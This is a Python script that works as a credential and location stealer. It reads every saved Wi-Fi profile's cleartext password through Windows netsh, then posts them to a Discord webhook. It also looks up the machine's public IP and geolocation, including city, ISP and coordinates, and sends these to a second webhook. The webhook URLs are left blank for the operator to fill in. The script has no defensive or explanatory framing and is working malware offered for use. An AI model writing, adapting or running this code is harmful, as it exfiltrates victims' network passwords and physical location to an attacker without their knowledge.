import requests
import subprocess
from dhooks import Webhook, Embed


def get_wifi_passwords():
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, check=True)
        profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]

        passwords = []
        for profile in profiles:
            try:
                result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True, check=True)
                password_lines = [line for line in result.stdout.splitlines() if "Key Content" in line]
                
                if password_lines:
                    password_line = password_lines[0]
                    password = password_line.split(":")[1].strip()
                    passwords.append({"name": profile, "password": password})
                else:
                    passwords.append({"name": profile, "password": "Not Available"})
            except subprocess.CalledProcessError:
                passwords.append({"name": profile, "password": "Not Available"})

        return passwords

    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return []

wifi_passwords = get_wifi_passwords()

embed = Embed(
    title='Wi-Fi Passwords',
    description='\n'.join([f"{wifi['name']}: {wifi['password']}" for wifi in wifi_passwords]),
    color=0xff0000
)

webhook_url = '' #discord webhook url

hook = Webhook(webhook_url)
hook.send(embed=embed)

ip = requests.get('https://api.ipify.org/').text

r = requests.get(f'https://extreme-ip-lookup.com/json/{ip}')
geo=r.json()
embed=Embed(
    title='IP Information',
    color=0x00ff00,
    timestamp='now'
)

fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'IP Type', 'value': geo['ipType']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'Country Code', 'value': geo['countryCode']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'IP Name', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitude', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Organization', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},
    {'name': 'Status', 'value': geo['status']}
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
webhook_url1 = '' #discord webhook url

hook1 = Webhook(webhook_url1)
hook1.send(embed=embed)
